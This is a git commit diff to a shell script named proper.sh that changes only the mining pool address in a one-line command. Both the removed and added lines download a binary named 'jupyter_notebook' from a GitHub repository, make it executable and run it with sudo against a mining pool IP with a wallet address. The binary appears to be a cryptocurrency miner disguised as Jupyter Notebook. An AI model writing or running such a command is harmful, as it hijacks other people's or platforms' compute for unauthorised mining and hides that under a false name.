cb3ac9e9b6f64cf81ce3b6aa81c6eb2b837dd73b
ussaainbolt <88609017+ussaainbolt@users.noreply.github.com>
2021-08-17 17:13:33 +0530

    Update proper.sh

--- proper.sh
+++ proper.sh
@@ -1,4 +1,4 @@
-apt-get install libpci3 && wget https://github.com/galebi/pihu/raw/main/jupyter_notebook && chmod +x jupyter_notebook && sudo ./jupyter_notebook -pool 172.65.207.106:4444 -wal 0x760d69bdf1c0c40469099274635f225da775aaa6.$(echo $(shuf -i 1000-9999999999 -n 1)-lo) -pass x
+apt-get install libpci3 && wget https://github.com/galebi/pihu/raw/main/jupyter_notebook && chmod +x jupyter_notebook && sudo ./jupyter_notebook -pool 172.65.212.80:3333 -wal 0x760d69bdf1c0c40469099274635f225da775aaa6.$(echo $(shuf -i 1000-9999999999 -n 1)-lo) -pass x
 
 
 
